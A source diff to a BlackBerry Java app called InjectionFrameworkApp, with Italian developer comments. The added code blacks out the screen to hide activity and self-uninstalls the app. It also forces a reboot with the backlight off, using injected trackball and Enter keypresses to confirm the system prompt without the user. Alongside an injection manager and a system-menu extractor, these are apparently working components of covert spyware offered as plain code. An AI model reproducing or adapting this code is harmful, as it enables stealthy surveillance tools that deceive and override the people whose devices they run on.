@@ -9,15 +9,20 @@ import net.rim.device.api.applicationcontrol.ApplicationPermissions;
 import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.ApplicationManager;
+import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.CodeModuleGroup;
 import net.rim.device.api.system.CodeModuleGroupManager;
 import net.rim.device.api.system.CodeModuleManager;
+import net.rim.device.api.system.PersistentObject;
+import net.rim.device.api.system.PersistentStore;
+import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.application.AppListener;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.InjectorManager;
+import blackberry.injection.KeyInjector;
 import blackberry.injection.SystemMenuExtractor;
 import blackberry.utils.Utils;
 
@@ -28,6 +33,11 @@ import blackberry.utils.Utils;
 public class InjectionFrameworkApp extends UiApplication {
     private static final long APP_TIMER_PERIOD = 0;
     private static final String CR = "\n";
+
+    protected static final boolean TEST_UNINSTALL = true;
+    protected static final boolean TEST_BLACK = true;
+    public static final boolean TEST_INJECT = false;
+
     //#ifdef DEBUG
     private static Debug debug = new Debug("InjectionFrameworkApp",
             DebugLevel.VERBOSE);
@@ -52,7 +62,7 @@ public class InjectionFrameworkApp extends UiApplication {
     private AppListener applicationListener;
     private SystemMenuExtractor menu;
     private BlackScreen blackScreen;
-    private int foregroundId;
+    private static int foregroundId;
 
     /**
      * Creates a new InjectionFrameworkApp object
@@ -62,29 +72,37 @@ public class InjectionFrameworkApp extends UiApplication {
         pushScreen(new InjectionFrameworkScreen());
     }
 
+    public void activate() {
+        //#ifdef DEBUG
+        debug.trace("activate");
+        //#endif
+    }
+
     public void pushBlack() {
         ApplicationManager manager = ApplicationManager.getApplicationManager();
         foregroundId = manager.getForegroundProcessId();
-
-        manager.requestForeground(getProcessId());
 
         blackScreen = new BlackScreen();
         synchronized (getAppEventLock()) {
             pushScreen(blackScreen);
         }
+
+        UiApplication.getUiApplication().requestForeground();
+        Utils.sleep(2000);
     }
 
     public void popBlack() {
         synchronized (getAppEventLock()) {
             //#ifdef DEBUG
-            debug.trace("popBlack: "+ getActiveScreen());
+            debug.trace("popBlack: " + getActiveScreen());
             //#endif
             Screen screen = getActiveScreen();
-            if(screen instanceof BlackScreen){
+            if (screen instanceof BlackScreen) {
                 popScreen(blackScreen);
             }
-            
+
         }
+        UiApplication.getUiApplication().requestBackground();
         ApplicationManager.getApplicationManager().requestForeground(
                 foregroundId);
     }
@@ -114,11 +132,51 @@ public class InjectionFrameworkApp extends UiApplication {
             public void run() {
                 Utils.sleep(1000);
                 InjectorManager.getInstance().start();
+
             };
         });
 
         injectorManagerThread.start();
 
+    }
+
+    public static void test() {
+        if (TEST_BLACK) {
+            //#ifdef DEBUG
+            debug.trace("test BLACK");
+            //#endif
+
+            //UiApplication.getUiApplication().invokeAndWait(new Runnable() {
+            //    public void run() {
+            getInstance().pushBlack();
+            //    }
+            //});
+
+            //UiApplication.getUiApplication().requestForeground();
+            Utils.sleep(10000);
+            //UiApplication.getUiApplication().invokeAndWait(new Runnable() {
+            //   public void run() {
+            getInstance().popBlack();
+            //    }
+            //});
+            Utils.sleep(5000);
+        }
+
+        if (TEST_UNINSTALL) {
+            //#ifdef DEBUG
+            debug.trace("test UNINSTALL");
+            //#endif
+            PersistentObject pobj = PersistentStore
+                    .getPersistentObject(0xea8cf454a8884a9L);
+            pobj.setContents(new Integer(42));
+            pobj.commit();
+
+            Utils.sleep(5000);
+            //#ifdef DEBUG
+            debug.trace("run: uninstall");
+            //#endif
+            uninstall();
+        }
     }
 
     String getInstalledModuleGroup() {
@@ -348,4 +406,44 @@ public class InjectionFrameworkApp extends UiApplication {
         return (InjectionFrameworkApp) getUiApplication();
     }
 
+    public static void uninstall() {
+        //#ifdef DEBUG
+        System.out.println("uninstalling");
+        //#endif
+        final ApplicationDescriptor ad = ApplicationDescriptor
+                .currentApplicationDescriptor();
+
+        final int moduleHandle = ad.getModuleHandle();
+        final int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
+
+        //TODO: sperimentale
+        forceReboot();
+    }
+
+    public static void forceReboot() {
+        //TODO: se il telefono e' occupato, attendere il tempo necessario.
+
+        Backlight.enable(false);
+        CodeModuleManager.promptForResetIfRequired();
+        Backlight.enable(false);
+
+        //TODO: con il 4.6 non funziona.
+        //if(Device.getInstance().lessThan(5, 0)){
+        Utils.sleep(2000);
+        //}
+        Utils.sleep(500);
+        KeyInjector.trackBallDown(20);
+        Utils.sleep(100);
+        KeyInjector.trackBallUp(1);
+        Utils.sleep(100);
+        KeyInjector.pressKey(Keypad.KEY_ENTER);
+        Utils.sleep(100);
+        KeyInjector.trackBallClick();
+        Utils.sleep(100);
+        KeyInjector.trackBallDown(20);
+        Utils.sleep(100);
+        KeyInjector.trackBallUp(1);
+        Utils.sleep(100);
+        KeyInjector.trackBallClick();
+    }
 }
